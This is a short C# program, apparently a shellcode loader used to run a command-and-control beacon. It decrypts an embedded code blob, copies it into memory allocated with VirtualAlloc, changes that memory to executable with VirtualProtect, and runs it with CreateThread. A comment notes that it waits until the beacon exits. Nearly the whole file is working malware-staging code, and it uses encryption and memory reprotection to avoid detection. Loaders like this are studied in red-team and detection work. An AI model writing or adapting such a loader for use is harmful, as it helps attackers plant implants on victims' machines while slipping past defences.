using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using static CreateThreadExample.Headers;

namespace CreateThreadExample
{
    class Program
    {
        static void Main(string[] args)
        {
            // Get decrypted pic
            byte[] pic = GetAllDecryptedBytes();
            
            // Allocate space for it
            IntPtr segment = VirtualAlloc(
                IntPtr.Zero,
                (uint)pic.Length,
                AllocationType.Commit,
                MemoryProtection.ReadWrite);

            // Copy over pic to segment
            Marshal.Copy(pic, 0, segment, pic.Length);

            // Reprotect segment to make it executable
            MemoryProtection oldProtect = new MemoryProtection();
            bool rxSuccess = VirtualProtect(segment, (uint)pic.Length, MemoryProtection.ExecuteRead, out oldProtect);

            // Prepare variables for CreateThread
            IntPtr threadId = IntPtr.Zero;
            SECURITY_ATTRIBUTES attrs = new SECURITY_ATTRIBUTES();
            // Create the thread
            IntPtr hThread = CreateThread(attrs, 0, segment, IntPtr.Zero, CreationFlags.Immediate, ref threadId);
            // Wait for its execution to finish, which is until beacon calls exit.
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
